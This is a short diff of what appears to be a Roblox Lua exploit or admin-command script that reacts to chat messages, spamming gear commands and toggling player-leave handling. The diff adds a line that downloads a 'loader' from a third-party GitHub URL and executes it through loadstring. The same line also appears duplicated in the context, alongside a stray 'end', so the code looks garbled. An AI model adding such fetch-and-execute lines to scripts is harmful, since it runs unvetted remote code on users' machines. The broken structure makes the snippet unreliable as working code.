@@ -37,6 +37,8 @@ game.Players.LocalPlayer.Chatted:Connect(function(msg)
         game.Players:Chat(".spam gear me 139574344")
         wait(5)
         game.Players:Chat(".stop")
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/ily123950/frost/main/loader'))()
+    end
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ily123950/frost/main/loader'))()
     if lowerMsg == ".disableplrleave" then
         isPlayerLeaveEnabled = false
